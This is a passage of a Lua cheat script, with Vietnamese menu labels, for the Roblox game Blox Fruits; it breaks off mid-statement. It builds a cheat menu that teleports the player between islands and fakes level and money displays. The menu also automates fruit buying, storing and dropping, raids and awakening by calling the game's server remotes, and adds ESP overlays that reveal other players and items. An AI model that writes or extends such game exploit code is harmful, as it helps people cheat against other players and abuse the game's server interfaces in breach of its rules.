            elseif _G.SelectIsland=="Port Town" then
                Tween(CFrame.new(-290.7376708984375, 6.729952812194824, 5343.5537109375))
            elseif _G.SelectIsland=="Hydra Island" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(5661.5322265625, 1013.0907592773438,-334.9649963378906))
            elseif _G.SelectIsland=="Floating Turtle" then
                Tween(CFrame.new(-13274.528320313, 531.82073974609,-7579.22265625))
            elseif _G.SelectIsland=="Mansion" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-12468.5380859375, 375.0094299316406,-7554.62548828125))
            elseif _G.SelectIsland=="Castle On The Sea" then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-5075.50927734375, 314.5155029296875,-3150.0224609375))
            elseif _G.SelectIsland=="Haunted Castle" then
                Tween(CFrame.new(-9515.3720703125, 164.00624084473, 5786.0610351562))
            elseif _G.SelectIsland=="Ice Cream Island" then
                Tween(CFrame.new(-902.56817626953, 79.93204498291,-10988.84765625))
            elseif _G.SelectIsland=="Peanut Island" then
                Tween(CFrame.new(-2062.7475585938, 50.473892211914,-10232.568359375))
            elseif _G.SelectIsland=="Cake Island" then
                Tween(CFrame.new(-1884.7747802734375, 19.327526092529297,-11666.8974609375))
            elseif _G.SelectIsland=="Cocoa Island" then
                Tween(CFrame.new(87.94276428222656, 73.55451202392578,-12319.46484375))
            elseif _G.SelectIsland=="Candy Island" then
                Tween(CFrame.new(-1014.4241943359375, 149.11068725585938,-14555.962890625))
            elseif _G.SelectIsland=="Tiki Outpost" then
                Tween(CFrame.new(-16542.447265625, 55.68632888793945, 1044.41650390625))
            end
        end
    })
    
    Tabs.Teleport:AddButton({
        Title = "Dừng bay",
        Description = "",
        Callback = function()
           Tween(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
        end
    })
    
-- Biến lưu toạ độ và trạng thái dịch chuyển


Tabs.Visual:AddButton({
    Title="Giả",
    Description="",
    Callback=function()
        local plr = game:GetService("Players").LocalPlayer
        local Notification = require(game:GetService("ReplicatedStorage").Notification)
        local Data = plr:WaitForChild("Data")
        local EXPFunction = require(game.ReplicatedStorage:WaitForChild("EXPFunction"))
        local LevelUp = require(game:GetService("ReplicatedStorage").Effect.Container.LevelUp)
        local Sound = require(game:GetService("ReplicatedStorage").Util.Sound)
        local LevelUpSound = game:GetService("ReplicatedStorage").Util.Sound.Storage.Other:FindFirstChild("LevelUp_Proxy") or game:GetService("ReplicatedStorage").Util.Sound.Storage.Other:FindFirstChild("LevelUp")
        function v129(p15)
            local v130 = p15;
            while true do
                local v131, v132=string.gsub(v130, "^(-?%d+)(%d%d%d)", "%1,%2");
                v130=v131;
                if v132==0 then
                    break;
                end;    
            end;
            return v130;
        end;
        Notification.new("<Color=Yellow>QUEST COMPLETED!<Color=/>"):Display()
        Notification.new("Earned<Color=Yellow>9,999,999,999,999 Exp.<Color=/>(+None)"):Display()
        Notification.new("Earned<Color=Green>$9,999,999,999,999<Color=/>"):Display()
        plr.Data.Exp.Value=999999999999
        plr.Data.Beli.Value=plr.Data.Beli.Value+999999999999
        delay=0
        count=0
        while plr.Data.Exp.Value-EXPFunction(Data.Level.Value)>0 do
            plr.Data.Exp.Value=plr.Data.Exp.Value-EXPFunction(Data.Level.Value)
            plr.Data.Level.Value=plr.Data.Level.Value+1
            plr.Data.Points.Value=plr.Data.Points.Value+3
            LevelUp({ plr })
            Sound.Play(Sound, LevelUpSound.Value)
            Notification.new("<Color=Green>LEVEL UP!<Color=/>(" .. plr.Data.Level.Value .. ")"):Display()
            count=count+1
            if count>=5 then
                delay=tick()
                count=0
                wait()
            end
        end
    end
})
Tabs.Visual:AddInput("Input_Level", {
    Title="Cấp",
    Default="",
    Placeholder="Nhập",
    Numeric=false, 
    Finished=false,
    Callback=function(value)
        game:GetService("Players")["LocalPlayer"].Data.Level.Value=tonumber(value)
    end
})
Tabs.Visual:AddInput("Input_EXP", {
    Title="Kinh Nghiệm",
    Default="",
    Placeholder="Nhập",
    Numeric=false, 
    Finished=false,
    Callback=function(value)
        game:GetService("Players")["LocalPlayer"].Data.Exp.Value=tonumber(value)
    end
})
Tabs.Visual:AddInput("Input_Beli", {
    Title="Tiền",
    Default="",
    Placeholder="Nhập",
    Numeric=false, 
    Finished=false,
    Callback=function(value)
        game:GetService("Players")["LocalPlayer"].Data.Beli.Value=tonumber(value)
    end
})
Tabs.Visual:AddInput("Input_Fragments", {
    Title="Điểm F",
    Default="",
    Placeholder="Nhập",
    Numeric=false, 
    Finished=false,
    Callback=function(value)
        game:GetService("Players")["LocalPlayer"].Data.Fragments.Value=tonumber(value)
    end
})    
local Remote_GetFruits = game.ReplicatedStorage:FindFirstChild("Remotes").CommF_:InvokeServer("GetFruits");
Table_DevilFruitSniper={}
ShopDevilSell={}
for i, v in next, Remote_GetFruits do
    table.insert(Table_DevilFruitSniper, v.Name)
    if v.OnSale then 
        table.insert(ShopDevilSell, v.Name)
    end
end
_G.SelectFruit=nil
_G.PermanentFruit=nil
_G.AutoBuyFruitSniper=false
_G.AutoSwitchPermanentFruit=false

local Fake = Tabs.Visual:AddSection("Fake Race V4")

Tabs.Visual:AddButton({
	Title = "Mink V4",
	Description = "",
	Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

 local Player = game:GetService("Players").LocalPlayer

 local ArgsTransform = {
  Character = game.Players.LocalPlayer.Character,
  CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame,
  Color1 = Color3.fromRGB(102, 255, 153),
  Color2 = Color3.fromRGB(102, 255, 153),
  Color3 = Color3.fromRGB(102, 255, 153),
 }

 Player.Character.Humanoid:LoadAnimation(ReplicatedStorage.Util.Anims.Storage["2"].RaceTransform):Play()

 delay(1, function()
  pcall(function() require(ReplicatedStorage.Effect.Container.RaceTransformation.Main)(ArgsTransform) end)
  end)
	end
})

Tabs.Visual:AddButton({
	Title = "Fish V4",
	Description = "",
	Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

 local Player = game:GetService("Players").LocalPlayer

 local ArgsTransform = {
  Character = game.Players.LocalPlayer.Character,
  CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame,
  Color1 = Color3.fromRGB(5, 115, 166),
  Color2 = Color3.fromRGB(5, 115, 166),
  Color3 = Color3.fromRGB(5, 115, 166),
 }

 Player.Character.Humanoid:LoadAnimation(ReplicatedStorage.Util.Anims.Storage["2"].RaceTransform):Play()

 delay(1, function()
  pcall(function() require(ReplicatedStorage.Effect.Container.RaceTransformation.Main)(ArgsTransform) end)
  end)
	end
})

Tabs.Visual:AddButton({
	Title = "Angel V4",
	Description = "",
	Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

 local Player = game:GetService("Players").LocalPlayer

 local ArgsTransform = {
  Character = game.Players.LocalPlayer.Character,
  CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame,
  Color1 = Color3.fromRGB(222, 222, 0),
  Color2 = Color3.fromRGB(222, 222, 0),
  Color3 = Color3.fromRGB(222, 222, 0),
 }

 Player.Character.Humanoid:LoadAnimation(ReplicatedStorage.Util.Anims.Storage["2"].RaceTransform):Play()

 delay(1, function()
  pcall(function() require(ReplicatedStorage.Effect.Container.RaceTransformation.Main)(ArgsTransform) end)
  end)
	end
})

Tabs.Visual:AddButton({
	Title = "Ghoul V4",
	Description = "",
	Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

 local Player = game:GetService("Players").LocalPlayer

 local ArgsTransform = {
  Character = game.Players.LocalPlayer.Character,
  CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame,
  Color1 = Color3.fromRGB(155, 155, 155),
  Color2 = Color3.fromRGB(0, 0, 0),
  Color3 = Color3.fromRGB(155, 155, 155),
 }

 Player.Character.Humanoid:LoadAnimation(ReplicatedStorage.Util.Anims.Storage["2"].RaceTransform):Play()

 delay(1, function()
  pcall(function() require(ReplicatedStorage.Effect.Container.RaceTransformation.Main)(ArgsTransform) end)
  end)
	end
})


Tabs.Visual:AddButton({
	Title = "Cyborg V4",
	Description = "",
	Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

 local Player = game:GetService("Players").LocalPlayer

 local ArgsTransform = {
  Character = game.Players.LocalPlayer.Character,
  CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame,
  Color1 = Color3.fromRGB(166, 0, 111),
  Color2 = Color3.fromRGB(166, 0, 111),
  Color3 = Color3.fromRGB(166, 0, 111),
 }

 Player.Character.Humanoid:LoadAnimation(ReplicatedStorage.Util.Anims.Storage["2"].RaceTransform):Play()

 delay(1, function()
  pcall(function() require(ReplicatedStorage.Effect.Container.RaceTransformation.Main)(ArgsTransform) end)
  end)
	end
})

Tabs.Visual:AddButton({
	Title = "Human V4",
	Description = "",
	Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

 local Player = game:GetService("Players").LocalPlayer

 local ArgsTransform = {
  Character = game.Players.LocalPlayer.Character,
  CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame,
  Color1 = Color3.fromRGB(166, 0, 0),
  Color2 = Color3.fromRGB(166, 0, 0),
  Color3 = Color3.fromRGB(166, 0, 0),
 }

 Player.Character.Humanoid:LoadAnimation(ReplicatedStorage.Util.Anims.Storage["2"].RaceTransform):Play()

 delay(1, function()
  pcall(function() require(ReplicatedStorage.Effect.Container.RaceTransformation.Main)(ArgsTransform) end)
  end)
	end
})

local DropdownFruit = Tabs.Fruit:AddDropdown("DropdownFruit", {
    Title="Chọn Trái",
    Description="",
    Values=Table_DevilFruitSniper,
    Multi=false,
    Default=1,
})
DropdownFruit:SetValue(_G.SelectFruit)
DropdownFruit:OnChanged(function(Value)
    _G.SelectFruit=Value
end)
local ToggleFruit = Tabs.Fruit:AddToggle("ToggleFruit", {
    Title="Mua Trái Chọn",
    Description="",
    Default=false 
})
ToggleFruit:OnChanged(function(Value)
    if Value then
        _G.AutoBuyFruitSniper=true
        pcall(function()
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetFruits")
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("PurchaseRawFruit", _G.SelectFruit, false)
        end)
        _G.AutoBuyFruitSniper=false
    end
end)
Options.ToggleFruit:SetValue(false)
local DropdownPermanentFruit = Tabs.Fruit:AddDropdown("DropdownPermanentFruit", {
    Title="Chọn Trái Vĩnh Viễn",
    Description="",
    Values=Table_DevilFruitSniper,
    Multi=false,
    Default=1,
})
DropdownPermanentFruit:SetValue(_G.PermanentFruit)
DropdownPermanentFruit:OnChanged(function(Value)
    _G.PermanentFruit=Value
end)
local TogglePermanentFruit = Tabs.Fruit:AddToggle("TogglePermanentFruit", {
    Title="Đổi Trái Vĩnh Viễn",
    Description="",
    Default=false 
})
TogglePermanentFruit:OnChanged(function(Value)
    if Value then
        _G.AutoSwitchPermanentFruit=true
        pcall(function()
            local args = {
                [1]="SwitchFruit",
                [2]=_G.PermanentFruit
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end)
        _G.AutoSwitchPermanentFruit=false
    end
end)
Options.TogglePermanentFruit:SetValue(false)

local ToggleDropFruit = Tabs.Fruit:AddToggle("ToggleDropFruit", {Title = "Tự Động Thả Trái", Default = false })
ToggleDropFruit:OnChanged(function(Value)
    _G.AutoDropFruit = Value
end)
Options.ToggleDropFruit:SetValue(false)

spawn(function()
    while wait() do
        if _G.AutoDropFruit then
            pcall(function()
                for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
                    if string.find(v.Name, "Fruit") then
                        EquipWeapon(v.Name)
                        SelectFruit = v.Name
                        wait(.1)
                        if game:GetService("Players").LocalPlayer.PlayerGui.Main.Dialogue.Visible == true then
                            game:GetService("Players").LocalPlayer.PlayerGui.Main.Dialogue.Visible = false
                        end
                        EquipWeapon(v.Name)
                        game:GetService("Players").LocalPlayer.Character:FindFirstChild(SelectFruit).EatRemote:InvokeServer("Drop")
                    end
                end
				for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
                    if string.find(v.Name, "Fruit") then
                        EquipWeapon(v.Name)
                        SelectFruit = v.Name
                        wait(.1)
                        if game:GetService("Players").LocalPlayer.PlayerGui.Main.Dialogue.Visible == true then
                            game:GetService("Players").LocalPlayer.PlayerGui.Main.Dialogue.Visible = false
                        end
                        EquipWeapon(v.Name)
                        game:GetService("Players").LocalPlayer.Character:FindFirstChild(SelectFruit).EatRemote:InvokeServer("Drop")
                    end
                end
            end)
        end
    end
end)

local ToggleStore = Tabs.Fruit:AddToggle("ToggleStore", {Title="Lưu Trái",Description="", Default=false })
ToggleStore:OnChanged(function(Value)
    _G.AutoStoreFruit=Value
end)
Options.ToggleStore:SetValue(false)
local Fruits = {
    ["Rocket Fruit"] = "Rocket-Rocket",
    ["Bomb Fruit"] = "Bomb-Bomb",
    ["Spike Fruit"] = "Spike-Spike",
    ["Chop Fruit"] = "Chop-Chop",
    ["Spring Fruit"] = "Spring-Spring",
    ["Kilo Fruit"] = "Kilo-Kilo",
    ["Smoke Fruit"] = "Smoke-Smoke",
    ["Spin Fruit"] = "Spin-Spin",
    ["Flame Fruit"] = "Flame-Flame",
    ["Bird: Falcon Fruit"] = "Bird-Bird: Falcon",
    ["Ice Fruit"] = "Ice-Ice",
    ["Sand Fruit"] = "Sand-Sand",
    ["Dark Fruit"] = "Dark-Dark",
    ["Revive Fruit"] = "Ghost-Ghost",
    ["Diamond Fruit"] = "Diamond-Diamond",
    ["Light Fruit"] = "Light-Light",
    ["Love Fruit"] = "Love-Love",
    ["Rubber Fruit"] = "Rubber-Rubber",
    ["Barrier Fruit"] = "Barrier-Barrier",
    ["Magma Fruit"] = "Magma-Magma",
    ["Portal Fruit"] = "Portal-Portal",
    ["Quake Fruit"] = "Quake-Quake",
    ["Human-Human: Buddha Fruit"] = "Human-Human: Buddha",
    ["Spider Fruit"] = "Spider-Spider",
    ["Bird: Phoenix Fruit"] = "Bird-Bird: Phoenix",
    ["Rumble Fruit"] = "Rumble-Rumble",
    ["Paw Fruit"] = "Pain-Pain",
    ["Gravity Fruit"] = "Gravity-Gravity",
    ["Dough Fruit"] = "Dough-Dough",
    ["Shadow Fruit"] = "Shadow-Shadow",
    ["Venom Fruit"] = "Venom-Venom",
    ["Control Fruit"] = "Control-Control",
    ["Soul Fruit"] = "Soul-Soul",
    ["Dragon Fruit"] = "Dragon-Dragon",
    ["Leopard Fruit"] = "Leopard-Leopard",
    ["Gas Fruit"] = "Gas-Gas",
    ["Sound Fruit"] = "Sound-Sound" -- Thêm trái Gas vào danh sách
}

spawn(function()
    while task.wait(0.1) do
        if _G.AutoStoreFruit then
            pcall(function()
                local player = game:GetService("Players").LocalPlayer
                local character = player.Character
                local backpack = player.Backpack
                local remote = game:GetService("ReplicatedStorage").Remotes.CommF_
                
                for fruitName, fruitID in pairs(Fruits) do
                    local fruit = character:FindFirstChild(fruitName) or backpack:FindFirstChild(fruitName)
                    if fruit then
                        remote:InvokeServer("StoreFruit", fruitID, fruit)
                    end
                end
            end)
        end
    end
end)

local ToggleRandomFruit = Tabs.Fruit:AddToggle("ToggleRandomFruit", {Title="Random Trái",Description="", Default=false })
ToggleRandomFruit:OnChanged(function(Value)
    _G.Random_Auto=Value
end)
Options.ToggleRandomFruit:SetValue(false)
spawn(function()
    pcall(function()
        while wait() do
            if _G.Random_Auto then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Cousin","Buy")
            end 
        end
    end)
end)
local ToggleCollectTP = Tabs.Fruit:AddToggle("ToggleCollectTP", {Title="Bay Đến Trái",Description="", Default=false })
ToggleCollectTP:OnChanged(function(Value)
    _G.CollectFruitTP=Value
end)
Options.ToggleCollectTP:SetValue(false)
spawn(function()
        while wait() do
            if _G.CollectFruitTP then
                    for i,v in pairs(game.Workspace:GetChildren()) do
                        if string.find(v.Name, "Fruit") then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=v.Handle.CFrame
                        end
                    end
                end
            end
       end)
local ToggleCollect = Tabs.Fruit:AddToggle("ToggleCollect", {Title="Dịch Chuyển Đến Trái",Description="", Default=false })
ToggleCollect:OnChanged(function(Value)
    _G.Tweenfruit=Value
end)
Options.ToggleCollect:SetValue(false)
spawn(function()
    while wait() do
        if _G.Tweenfruit then
            for i,v in pairs(game.Workspace:GetChildren()) do
                if string.find(v.Name, "Fruit") then
                    Tween(v.Handle.CFrame)
                end
            end
        end
end
end)
local Mastery = Tabs.Fruit:AddSection("Định Vị")
local ToggleEspPlayer = Tabs.Fruit:AddToggle("ToggleEspPlayer", {Title="Người Chơi",Description="", Default=false })
ToggleEspPlayer:OnChanged(function(Value)
    ESPPlayer=Value
    UpdatePlayerChams()
end)
Options.ToggleEspPlayer:SetValue(false)
local ToggleEspFruit = Tabs.Fruit:AddToggle("ToggleEspFruit", {Title="Trái",Description="", Default=false })
ToggleEspFruit:OnChanged(function(Value)
    DevilFruitESP=Value
    while DevilFruitESP do wait()
        UpdateDevilChams() 
    end
end)
Options.ToggleEspFruit:SetValue(false)
local ToggleEspIsland = Tabs.Fruit:AddToggle("ToggleEspIsland", {Title="Đảo",Description="", Default=false })
ToggleEspIsland:OnChanged(function(Value)
    IslandESP=Value
    while IslandESP do wait()
        UpdateIslandESP() 
    end
end)
Options.ToggleEspIsland:SetValue(false)
local ToggleEspFlower = Tabs.Fruit:AddToggle("ToggleEspFlower", {Title="Hoa",Description="", Default=false })
ToggleEspFlower:OnChanged(function(Value)
    FlowerESP=Value
    UpdateFlowerChams() 
end)
Options.ToggleEspFlower:SetValue(false)
spawn(function()
    while wait() do
        if FlowerESP then
            UpdateFlowerChams() 
        end
        if DevilFruitESP then
            UpdateDevilChams() 
        end
        if ChestESP then
            UpdateChestChams() 
        end
        if ESPPlayer then
            UpdatePlayerChams()
        end
        if RealFruitESP then
            UpdateRealFruitChams()
        end
    end
end)
local ToggleEspRealFruit = Tabs.Fruit:AddToggle("ToggleEspRealFruit", {Title="Trái Dứa Khớm Táo", Description="", Default=false })
ToggleEspRealFruit:OnChanged(function(Value)
    RealFruitEsp=Value
    while RealFruitEsp do 
        wait()
        UpdateRealFruitEsp() 
    end
end)
Options.ToggleEspRealFruit:SetValue(false)
function UpdateRealFruitEsp() 
    for _, v in pairs(game.Workspace.AppleSpawner:GetChildren()) do
        if v:IsA("Tool") then
            if RealFruitEsp then 
                if not v.Handle:FindFirstChild('NameEsp'..Number) then
                    local bill = Instance.new('BillboardGui', v.Handle)
                    bill.Name='NameEsp'..Number
                    bill.ExtentsOffset=Vector3.new(0, 1, 0)
                    bill.Size=UDim2.new(1, 200, 1, 30)
                    bill.Adornee=v.Handle
                    bill.AlwaysOnTop=true
                    local name = Instance.new('TextLabel', bill)
                    name.Font=Enum.Font.GothamSemibold
                    name.FontSize="Size14"
                    name.TextWrapped=true
                    name.Size=UDim2.new(1, 0, 1, 0)
                    name.TextYAlignment='Top'
                    name.BackgroundTransparency=1
                    name.TextStrokeTransparency=0.5
                    name.TextColor3=Color3.fromRGB(255, 0, 0)
                    name.Text=(v.Name .. ' \n' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) .. ' Distance')
                else
                    v.Handle['NameEsp'..Number].TextLabel.Text=(v.Name .. ' ' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) .. ' Distance')
                end
            else
                if v.Handle:FindFirstChild('NameEsp'..Number) then
                    v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
                end
            end 
        end
    end
    for _, v in pairs(game.Workspace.PineappleSpawner:GetChildren()) do
        if v:IsA("Tool") then
            if RealFruitEsp then 
                if not v.Handle:FindFirstChild('NameEsp'..Number) then
                    local bill = Instance.new('BillboardGui', v.Handle)
                    bill.Name='NameEsp'..Number
                    bill.ExtentsOffset=Vector3.new(0, 1, 0)
                    bill.Size=UDim2.new(1, 200, 1, 30)
                    bill.Adornee=v.Handle
                    bill.AlwaysOnTop=true
                    local name = Instance.new('TextLabel', bill)
                    name.Font=Enum.Font.GothamSemibold
                    name.FontSize="Size14"
                    name.TextWrapped=true
                    name.Size=UDim2.new(1, 0, 1, 0)
                    name.TextYAlignment='Top'
                    name.BackgroundTransparency=1
                    name.TextStrokeTransparency=0.5
                    name.TextColor3=Color3.fromRGB(255, 174, 0)
                    name.Text=(v.Name .. ' \n' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) .. ' Distance')
                else
                    v.Handle['NameEsp'..Number].TextLabel.Text=(v.Name .. ' ' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) .. ' Distance')
                end
            else
                if v.Handle:FindFirstChild('NameEsp'..Number) then
                    v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
                end
            end 
        end
    end
    for _, v in pairs(game.Workspace.BananaSpawner:GetChildren()) do
        if v:IsA("Tool") then
            if RealFruitEsp then 
                if not v.Handle:FindFirstChild('NameEsp'..Number) then
                    local bill = Instance.new('BillboardGui', v.Handle)
                    bill.Name='NameEsp'..Number
                    bill.ExtentsOffset=Vector3.new(0, 1, 0)
                    bill.Size=UDim2.new(1, 200, 1, 30)
                    bill.Adornee=v.Handle
                    bill.AlwaysOnTop=true
                    local name = Instance.new('TextLabel', bill)
                    name.Font=Enum.Font.GothamSemibold
                    name.FontSize="Size14"
                    name.TextWrapped=true
                    name.Size=UDim2.new(1, 0, 1, 0)
                    name.TextYAlignment='Top'
                    name.BackgroundTransparency=1
                    name.TextStrokeTransparency=0.5
                    name.TextColor3=Color3.fromRGB(251, 255, 0)
                    name.Text=(v.Name .. ' \n' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) .. ' Distance')
                else
                    v.Handle['NameEsp'..Number].TextLabel.Text=(v.Name .. ' ' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Handle.Position).Magnitude/3) .. ' Distance')
                end
            else
                if v.Handle:FindFirstChild('NameEsp'..Number) then
                    v.Handle:FindFirstChild('NameEsp'..Number):Destroy()
                end
            end 
        end
    end
end
local ToggleIslandMirageEsp = Tabs.Fruit:AddToggle("ToggleIslandMirageEsp", {Title="Đảo Bí Ẩn", Description="", Default=false })
ToggleIslandMirageEsp:OnChanged(function(Value)
    IslandMirageEsp=Value
    while IslandMirageEsp do 
        wait()
        UpdateIslandMirageEsp() 
    end
end)
Options.ToggleIslandMirageEsp:SetValue(false)
function isnil(thing)
    return (thing==nil)
end
local function round(n)
    return math.floor(tonumber(n)+0.5)
end
Number=math.random(1, 1000000)
function UpdateIslandMirageEsp() 
    for _, v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
        pcall(function()
            if MirageIslandESP then 
                if v.Name=="Mirage Island" then
                    if not v:FindFirstChild('NameEsp') then
                        local bill = Instance.new('BillboardGui', v)
                        bill.Name='NameEsp'
                        bill.ExtentsOffset=Vector3.new(0, 1, 0)
                        bill.Size=UDim2.new(1, 200, 1, 30)
                        bill.Adornee=v
                        bill.AlwaysOnTop=true
                        local name = Instance.new('TextLabel', bill)
                        name.Font=Enum.Font.Code
                        name.FontSize=Enum.FontSize.Size14
                        name.TextWrapped=true
                        name.Size=UDim2.new(1, 0, 1, 0)
                        name.TextYAlignment=Enum.TextYAlignment.Top
                        name.BackgroundTransparency=1
                        name.TextStrokeTransparency=0.5
                        name.TextColor3=Color3.fromRGB(80, 245, 245)
                    else
                        v['NameEsp'].TextLabel.Text=(v.Name .. '   \n' .. round((game:GetService('Players').LocalPlayer.Character.Head.Position-v.Position).Magnitude/3) .. ' M')
                    end
                end
            else
                if v:FindFirstChild('NameEsp') then
                    v:FindFirstChild('NameEsp'):Destroy()
                end
            end
        end)
    end
end
local Chips = {"Flame","Ice","Quake","Light","Dark","Spider","Rumble","Magma","Buddha","Sand","Phoenix","Dough"}
local DropdownRaid = Tabs.Raid:AddDropdown("DropdownRaid", {
    Title="Chọn Chip",
    Description="",
    Values=Chips,
    Multi=false,
    Default=1,
})
DropdownRaid:SetValue(SelectChip)
DropdownRaid:OnChanged(function(Value)
    SelectChip=Value
end)
local ToggleBuy = Tabs.Raid:AddToggle("ToggleBuy", {Title="Mua Chip", Description="",Default=false })
ToggleBuy:OnChanged(function(Value)
    _G.Auto_Buy_Chips_Dungeon=Value
end)
Options.ToggleBuy:SetValue(false)
spawn(function()
    while wait() do
        if _G.Auto_Buy_Chips_Dungeon then
            pcall(function()
                local args = {
                    [1]="RaidsNpc",
                    [2]="Select",
                    [3]=SelectChip
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end)
        end
    end
end)
    local ToggleStart = Tabs.Raid:AddToggle("ToggleStart", {Title="Bắt Đầu Raid",Description="", Default=false })
    ToggleStart:OnChanged(function(Value)
        _G.Auto_StartRaid=Value
end)
Options.ToggleStart:SetValue(false)
spawn(function()
    while wait() do
        pcall(function()
            if _G.Auto_StartRaid then
               if game:GetService("Players")["LocalPlayer"].PlayerGui.Main.Timer.Visible == false then
                    if not game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Island 1") and game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Special Microchip") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Special Microchip") then
                        if Sea2 then
                            fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector)
                        elseif Sea3 then
                            fireclickdetector(game:GetService("Workspace").Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector)
                        end
                    end
                end
            end
        end)
    end
end)
local ToggleNextIsland = Tabs.Raid:AddToggle("ToggleNextIsland", {
    Title="Đấm Quái Raid+Bay Đến Đảo",
    Description="",
    Default=false
})
ToggleNextIsland:OnChanged(function(Value)
    AutoNextIsland=Value
    if not Value then
        _G.AutoNear=false
    end
end)
Options.ToggleNextIsland:SetValue(false)
spawn(function()
    local visitedIslands = {}
    while task.wait() do
        if AutoNextIsland then
            pcall(function()
                local character = game.Players.LocalPlayer.Character
                if character and character:FindFirstChild("HumanoidRootPart") then
                    local locations = game:GetService("Workspace")["_WorldOrigin"].Locations
                    local pos = character.HumanoidRootPart.Position
                    if (pos-Vector3.new(-6438.73535, 250.645355,-4501.50684)).Magnitude<1000000000 or
                       (pos-Vector3.new(-5017.40869, 314.844055,-2823.0127)).Magnitude<1000000000 then
                        visitedIslands={}  
                    end
                    if locations:FindFirstChild("Island 1") then
                        _G.AutoNear=true
                    end
                    if locations:FindFirstChild("Island 2") and not visitedIslands["Island 2"] then
                        Tween(locations:FindFirstChild("Island 2").CFrame)
                        visitedIslands["Island 2"]=true
                        AutoNextIsland=false
                        wait()
                        AutoNextIsland=true
                    elseif locations:FindFirstChild("Island 3") and not visitedIslands["Island 3"] then
                        Tween(locations:FindFirstChild("Island 3").CFrame)
                        visitedIslands["Island 3"]=true
                        AutoNextIsland=false
                        wait()
                        AutoNextIsland=true
                    elseif locations:FindFirstChild("Island 4") and not visitedIslands["Island 4"] then
                        Tween(locations:FindFirstChild("Island 4").CFrame)
                        visitedIslands["Island 4"]=true
                        AutoNextIsland=false
                        wait()
                        AutoNextIsland=true
                    elseif locations:FindFirstChild("Island 5") and not visitedIslands["Island 5"] then
                        Tween(locations:FindFirstChild("Island 5").CFrame)
                        visitedIslands["Island 5"]=true
                        AutoNextIsland=false
                        wait()
                        AutoNextIsland=true
                    end
                end
            end)
        end
    end
end)
local ToggleAwake = Tabs.Raid:AddToggle("ToggleAwake", {Title="Thức Tỉnh",Description="", Default=false })
ToggleAwake:OnChanged(function(Value)
    AutoAwakenAbilities=Value
end)
Options.ToggleAwake:SetValue(false)
spawn(function()
    while task.wait() do
        if AutoAwakenAbilities then
            pcall(function()
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Awakener","Awaken")
            end)
        end
    end
end)
local ToggleGetFruit = Tabs.Raid:AddToggle("ToggleGetFruit", {Title="Lấy Trái Dưới 1 Triệu",Description="", Default=false })
ToggleGetFruit:OnChanged(function(Value)
    _G.Autofruit=Value
end)
spawn(function()
    while wait() do
        pcall(function()
     if _G.Autofruit then
local args = {
    [1]="LoadFruit",
    [2]="Rocket-Rocket"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Spin-Spin"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Chop-Chop"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Spring-Spring"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Bomb-Bomb"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Smoke-Smoke"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Spike-Spike"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Flame-Flame"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
    [1]="LoadFruit",
    [2]="Falcon-Falcon"
}
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
local args = {
